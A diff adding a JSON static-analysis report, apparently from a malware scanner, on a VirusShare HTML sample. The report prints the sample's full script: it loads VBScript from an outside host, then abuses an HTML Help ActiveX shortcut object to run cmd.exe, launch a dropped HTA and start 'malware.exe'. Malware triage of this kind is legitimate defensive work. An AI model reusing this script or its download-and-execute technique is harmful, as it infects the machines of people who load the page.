@@ -1,0 +1,47 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "command": "May run PowerShell commands",
+            "write": "May write to a file"
+        },
+        "macro": "function writehta(){\ndocument.write(\"<script language=\"\\\"vbscript\\\" src=\"\\\"http://freehost19.websamba.com/shreddersub7/cmdexe2.txt\\\"></script>\");\n}\nfunction writeexe(){\ndocument.write(\"<object id=\"a\" classid=\"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\"><param name=\"command\" value=\"shortcut\"><param name=\"item1\" value=\",cmd.exe,/d /c start /min C:/cmdexe.hta\"></object><script>a.Click\\(\\)</script>\");\n}\nfunction startexe(){\ndocument.write(\"<object id=\"b\" classid=\"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\"><param name=\"command\" value=\"shortcut\"><param name=\"item1\" value=\",cmd.exe,/d /c del \\\"C:/cmdexe.hta\\\"&&start C:/malware.exe\"></object><object id=\"c\" classid=\"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\"><param name=\"command\" value=\"close\"></object><script>b.Click\\(\\);c.Click\\(\\)</script>\");\n}\nsetTimeout(\"writehta()\",1);\nsetTimeout(\"writeexe()\",2000);\nsetTimeout(\"startexe()\",5000);"
+    },
+    "filename": "VirusShare_3c50f4ea95ee113acc7f5dcc16efabc4",
+    "filesize": 904,
+    "filetype": "HTML document, ASCII text, with very long lines, with CRLF line terminators",
+    "hashes": {
+        "md5": "3c50f4ea95ee113acc7f5dcc16efabc4",
+        "sha1": "1d65f30d9a3dd222d8778ca3f4d3efa13c5796c9",
+        "sha256": "b1229fc7c950e913f2caaf51aa086ebd9b8c1ea595d51bc339b5b0d5dcc1616c"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "function writehta(){",
+            "document.write(\"<script language=\"\\\"vbscript\\\" src=\"\\\"http://freehost19.websamba.com/shreddersub7/cmdexe2.txt\\\"></script>\");",
+            "function writeexe(){",
+            "document.write(\"<object id=\"a\" classid=\"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\"><param name=\"command\" value=\"shortcut\"><param name=\"item1\" value=\",cmd.exe,/d /c start /min C:/cmdexe.hta\"></object><script>a.Click\\(\\)</script>\");",
+            "function startexe(){",
+            "document.write(\"<object id=\"b\" classid=\"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\"><param name=\"command\" value=\"shortcut\"><param name=\"item1\" value=\",cmd.exe,/d /c del \\\"C:/cmdexe.hta\\\"&&start C:/malware.exe\"></object><object id=\"c\" classid=\"clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\"><param name=\"command\" value=\"close\"></object><script>b.Click\\(\\);c.Click\\(\\)</script>\");",
+            "setTimeout(\"writehta()\",1);",
+            "setTimeout(\"writeexe()\",2000);",
+            "setTimeout(\"startexe()\",5000);"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://freehost19.websamba.com/shreddersub7/cmdexe2.txt\\"
+        ]
+    },
+    "time": "0:00:00.255713",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
